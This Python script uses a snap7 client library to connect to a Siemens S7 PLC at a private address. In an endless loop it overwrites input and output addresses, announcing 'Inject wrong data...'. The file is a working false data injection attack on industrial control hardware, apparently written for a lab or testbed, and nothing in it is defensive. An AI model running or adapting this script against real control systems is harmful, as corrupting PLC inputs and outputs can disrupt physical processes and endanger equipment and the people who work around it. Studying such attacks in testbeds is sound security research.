import time,os
import snap7Comm
from snap7Comm import BOOL_TYPE
hostIp = '192.168.126.130'
hostPort = 102
dirpath = os.path.dirname(os.path.abspath(__file__))
gS7snapDllPath = os.path.join(dirpath, 'snap7.dll')  
s7commClient = snap7Comm.s7CommClient(hostIp, hostPort, snapLibPath=gS7snapDllPath)
print('Try to connect to the target S7 PLC: %s' %str(hostIp))
while True:
    print("Inject wrong data...")
    #input
    s7commClient.setAddressVal(1, 0, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(1, 2, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(1, 4, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(1, 6, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(2, 0, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(2, 2, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(2, 4, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(2, 6, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    #output
    s7commClient.setAddressVal(3, 0, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(3, 2, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(3, 4, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(3, 6, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(4, 0, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(4, 2, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    s7commClient.setAddressVal(4, 4, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1) 
    s7commClient.setAddressVal(4, 6, 10, dataType=snap7Comm.BOOL_TYPE)
    time.sleep(0.1)
    time.sleep(1)
    
    